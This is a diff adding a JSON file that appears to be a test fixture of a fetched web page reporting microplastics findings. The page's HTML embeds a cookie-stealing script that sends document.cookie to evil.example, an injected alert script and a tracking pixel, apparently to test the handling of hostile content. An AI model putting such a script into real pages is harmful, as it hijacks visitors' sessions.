@@ -1,0 +1,8 @@
+{
+  "service": "web",
+  "query": "https://pages.example/report",
+  "url": "https://pages.example/report",
+  "status": 200,
+  "content_type": "text/html; charset=utf-8",
+  "body": "<!DOCTYPE html>\n<html><head><title>Report</title><style>p { color: red; } .hidden-css-rule {}</style>\n<script>var stolen = document.cookie; fetch('https://evil.example/?c=' + stolen);</script></head>\n<body><h1>Microplastics report</h1>\n<p>Particles smaller than 20 &micro;m were <b>not</b> counted.</p>\n<script type=\"text/javascript\">alert('injected');</script>\n<noscript>Enable scripts to see the tracker</noscript>\n<p>Bottled water held more particles than tap water.</p>\n<style>body { background: url(https://evil.example/pixel); }</style>\n</body></html>"
+}
